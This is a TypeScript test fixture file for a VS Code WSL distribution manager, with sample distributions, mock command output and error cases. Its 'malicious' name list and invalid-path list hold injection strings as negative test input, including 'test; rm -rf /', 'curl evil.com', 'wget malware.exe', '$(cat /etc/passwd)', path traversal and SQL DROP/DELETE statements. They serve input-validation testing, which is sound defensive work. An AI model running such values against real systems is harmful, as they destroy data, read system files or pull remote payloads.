/**
 * Test Fixtures: WSL Distributions
 *
 * Reusable test data for consistent testing across all test suites.
 * These fixtures represent common distribution states and configurations.
 */

import { WSLDistribution } from '../../src/wslManager';

// Valid distribution configurations
export const validDistribution: WSLDistribution = {
    name: 'Ubuntu-22.04',
    state: 'Running',
    version: 2,
    defaultUser: 'ubuntu',
    defaultUid: 1000,
    environmentVariables: [],
    flags: 0,
    wslVersion: '2'
};

export const stoppedDistribution: WSLDistribution = {
    ...validDistribution,
    name: 'Debian-11',
    state: 'Stopped',
    defaultUser: 'debian'
};

export const installingDistribution: WSLDistribution = {
    ...validDistribution,
    name: 'Alpine-3.18',
    state: 'Installing',
    defaultUser: 'alpine'
};

// Distribution lists for testing
export const multipleDistributions: WSLDistribution[] = [
    validDistribution,
    stoppedDistribution,
    {
        name: 'Kali-Linux',
        state: 'Running',
        version: 2,
        defaultUser: 'kali',
        defaultUid: 1000,
        environmentVariables: [],
        flags: 0,
        wslVersion: '2'
    },
    {
        name: 'openSUSE-Leap-15.5',
        state: 'Stopped',
        version: 2,
        defaultUser: 'opensuse',
        defaultUid: 1000,
        environmentVariables: [],
        flags: 0,
        wslVersion: '2'
    }
];

// WSL command outputs (raw)
export const wslOutputs = {
    // wsl --list --verbose output
    listVerbose: `  NAME                   STATE           VERSION
* Ubuntu-22.04           Running         2
  Debian-11              Stopped         2
  Kali-Linux             Running         2
  openSUSE-Leap-15.5     Stopped         2`,

    // wsl --list --all output
    listAll: `Windows Subsystem for Linux Distributions:
Ubuntu-22.04 (Default)
Debian-11
Kali-Linux
openSUSE-Leap-15.5`,

    // Empty list
    listEmpty: `Windows Subsystem for Linux Distributions:`,

    // Error outputs
    wslNotInstalled: `'wsl' is not recognized as an internal or external command,
operable program or batch file.`,

    noDistributions: `Windows Subsystem for Linux has no installed distributions.
Distributions can be installed by visiting the Microsoft Store:
https://aka.ms/wslstore`
};

// Distribution names for testing
export const distributionNames = {
    valid: [
        'Ubuntu-22.04',
        'Debian-11',
        'Alpine-3.18',
        'Fedora-38',
        'openSUSE-Leap-15.5',
        'Kali-Linux',
        'Ubuntu',
        'TestDistro',
        'MyProject-Dev',
        'project_123'
    ],

    invalid: [
        '', // Empty
        ' ', // Whitespace
        'test distro', // Space
        'test;distro', // Semicolon
        'test&distro', // Ampersand
        'test|distro', // Pipe
        'test>distro', // Redirect
        'test<distro', // Redirect
        '../test', // Path traversal
        '..\\test', // Windows path traversal
        'test`cmd`', // Command substitution
        'test$(cmd)', // Command substitution
        'test${var}', // Variable expansion
        '!@#$%^&*()', // Special characters
        'null', // Reserved
        'undefined', // Reserved
        'CON', // Windows reserved
        'PRN', // Windows reserved
        'AUX', // Windows reserved
        'NUL', // Windows reserved
        'COM1', // Windows reserved
        'LPT1' // Windows reserved
    ],

    malicious: [
        'test; rm -rf /',
        'test && curl evil.com',
        'test || wget malware.exe',
        'test`whoami`',
        'test$(cat /etc/passwd)',
        'test${IFS}&&${IFS}ls',
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'test\'; DROP TABLE users; --',
        'test"; DELETE FROM data; --'
    ]
};

// Import/Export paths
export const importExportPaths = {
    valid: [
        'C:\\WSL\\Exports\\ubuntu.tar',
        'C:\\Users\\User\\Downloads\\debian.tar',
        'D:\\Backups\\distro.tar',
        '/mnt/c/exports/ubuntu.tar',
        './exports/distro.tar',
        'exports/distro.tar'
    ],

    invalid: [
        '', // Empty
        ' ', // Whitespace
        'C:\\WSL\\Exports\\ubuntu.exe', // Wrong extension
        'ubuntu.zip', // Wrong extension
        '../../../etc/passwd', // Path traversal
        'C:\\Windows\\System32\\config.tar', // System path
        'http://evil.com/malware.tar', // URL
        'ftp://server/distro.tar', // Protocol
        '\\\\network\\share\\distro.tar', // UNC path
        'CON.tar', // Reserved name
        'test;.tar', // Special character
        'test|.tar' // Pipe character
    ]
};

// Terminal profile configurations
export const terminalProfiles = {
    ubuntu: {
        profileName: 'Ubuntu-22.04',
        commandLine: 'wsl.exe -d Ubuntu-22.04',
        icon: '🐧',
        startingDirectory: '~',
        environmentVariables: {}
    },

    debian: {
        profileName: 'Debian-11',
        commandLine: 'wsl.exe -d Debian-11',
        icon: '🔴',
        startingDirectory: '~',
        environmentVariables: {}
    },

    withCustomSettings: {
        profileName: 'Dev Environment',
        commandLine: 'wsl.exe -d Ubuntu-22.04 --cd /home/dev/projects',
        icon: '💻',
        startingDirectory: '/home/dev/projects',
        environmentVariables: {
            NODE_ENV: 'development',
            DEBUG: 'true'
        }
    }
};

// Error scenarios
export const errorScenarios = {
    wslNotInstalled: {
        error: new Error('\'wsl\' is not recognized'),
        userMessage: 'WSL is not installed on this system',
        code: 'WSL_NOT_INSTALLED'
    },

    distributionNotFound: {
        error: new Error('There is no distribution with the supplied name'),
        userMessage: 'Distribution not found',
        code: 'DISTRIBUTION_NOT_FOUND'
    },

    distributionAlreadyExists: {
        error: new Error('A distribution with that name already exists'),
        userMessage: 'Distribution already exists',
        code: 'DISTRIBUTION_EXISTS'
    },

    accessDenied: {
        error: new Error('Access is denied'),
        userMessage: 'Permission denied. Please run VS Code as administrator.',
        code: 'ACCESS_DENIED'
    },

    diskSpaceError: {
        error: new Error('There is not enough space on the disk'),
        userMessage: 'Insufficient disk space',
        code: 'DISK_FULL'
    },

    timeout: {
        error: new Error('Command timed out'),
        userMessage: 'Operation timed out',
        code: 'TIMEOUT'
    }
};

// Mock command responses
export const commandResponses = {
    success: {
        stdout: '',
        stderr: '',
        code: 0
    },

    listDistributions: {
        stdout: wslOutputs.listVerbose,
        stderr: '',
        code: 0
    },

    importSuccess: {
        stdout: 'The operation completed successfully.',
        stderr: '',
        code: 0
    },

    exportSuccess: {
        stdout: 'Export completed successfully.',
        stderr: '',
        code: 0
    },

    deleteSuccess: {
        stdout: 'The operation completed successfully.',
        stderr: '',
        code: 0
    },

    error: {
        stdout: '',
        stderr: 'An error occurred',
        code: 1
    }
};

/**
 * Test data builder for creating custom distributions
 */
export class DistributionBuilder {
    private distribution: Partial<WSLDistribution> = {
        name: 'TestDistro',
        state: 'Running',
        version: 2,
        defaultUser: 'testuser',
        defaultUid: 1000,
        environmentVariables: [],
        flags: 0,
        wslVersion: '2'
    };

    withName(name: string): this {
        this.distribution.name = name;
        return this;
    }

    withState(state: string): this {
        this.distribution.state = state;
        return this;
    }

    withVersion(version: number): this {
        this.distribution.version = version;
        return this;
    }

    withUser(user: string, uid: number = 1000): this {
        this.distribution.defaultUser = user;
        this.distribution.defaultUid = uid;
        return this;
    }

    withEnvironment(vars: string[]): this {
        this.distribution.environmentVariables = vars;
        return this;
    }

    stopped(): this {
        this.distribution.state = 'Stopped';
        return this;
    }

    running(): this {
        this.distribution.state = 'Running';
        return this;
    }

    build(): WSLDistribution {
        return this.distribution as WSLDistribution;
    }
}

/**
 * Create a mock WSL output for testing
 */
export function createMockWslOutput(distributions: WSLDistribution[]): string {
    let output = '  NAME                   STATE           VERSION\n';

    distributions.forEach((distro, index) => {
        const defaultMarker = index === 0 ? '*' : ' ';
        const name = distro.name.padEnd(23);
        const state = distro.state.padEnd(15);
        output += `${defaultMarker} ${name}${state}${distro.version}\n`;
    });

    return output;
}

/**
 * Create a mock error for testing
 */
export function createMockError(scenario: keyof typeof errorScenarios) {
    return errorScenarios[scenario];
}